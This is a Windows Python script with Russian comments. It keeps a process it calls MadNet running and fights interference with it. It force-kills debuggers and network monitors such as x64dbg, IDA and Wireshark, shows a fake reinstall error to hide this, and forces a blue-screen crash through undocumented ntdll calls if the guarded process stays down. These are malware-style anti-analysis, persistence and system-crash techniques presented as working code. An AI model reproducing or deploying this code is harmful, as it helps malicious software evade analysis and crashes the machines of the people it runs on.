import asyncio
import subprocess
import tkinter as tk
from tkinter import messagebox
import ctypes


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


root = tk.Tk()
root.withdraw()

process_name = "example.exe"  # имя процесса, который нужно проверить
process_file_path = "C:\\Path\\To\\Process\\File\\example.exe"  # путь к файлу процесса

debuggers = ['OllyDbg.exe', 'WinDbg.exe', 'devenv.exe', 'gdb.exe', 'x64dbg.exe', 'idaw.exe', 'immunitydebugger.exe',
             'processhacker.exe', 'wireshark.exe', 'nc.exe', 'telnet.exe', 'netmon.exe', 'tcpdump.exe']


def bsod():
    nullptr = ctypes.POINTER(ctypes.c_int)()

    ctypes.windll.ntdll.RtlAdjustPrivilege(
        ctypes.c_uint(19),
        ctypes.c_uint(1),
        ctypes.c_uint(0),
        ctypes.byref(ctypes.c_int())
    )

    ctypes.windll.ntdll.NtRaiseHardError(
        ctypes.c_ulong(0xC000007B),
        ctypes.c_ulong(0),
        nullptr,
        nullptr,
        ctypes.c_uint(6),
        ctypes.byref(ctypes.c_uint())
    )


async def check_and_restart_process():
    start = False
    while True:
        # проверяем, работает ли процесс
        result = subprocess.run(["tasklist"], stdout=subprocess.PIPE)
        output = result.stdout.decode("utf-8").strip()
        if process_name not in output:
            # если процесс не работает, то пытаемся его перезапустить
            try:
                if start and is_admin():
                    # Вызываем BSOD, если есть права администратора и MadNet нет в списке процессов
                    bsod()
                else:
                    # проверяем, запущен ли скрипт от имени администратора
                    if is_admin():
                        # если запущен, то перезапускаем процесс от имени администратора
                        subprocess.run(["start", "cmd", "/c", "runas", process_file_path])
                        start = True
                    else:
                        # если не запущен, то перезапускаем процесс обычным способом
                        subprocess.run([process_file_path])
                        start = True
            except:
                return False
        else:
            return True
        for debugger in debuggers:
            if debugger in output:
                if is_admin():
                    subprocess.run(["taskkill", "/IM", f"{debugger}", "/F"])
                    messagebox.showerror("Ошибка",
                                         "Неизвестная ошибка во время работы программы. Пожалуйста, попробуйте "
                                         "удалить и заново установить программу, либо обратитесь к специалисту за "
                                         "помощью.")

        await asyncio.sleep(60)  # ждем 60 секунд перед следующей проверкой


asyncio.run(check_and_restart_process())
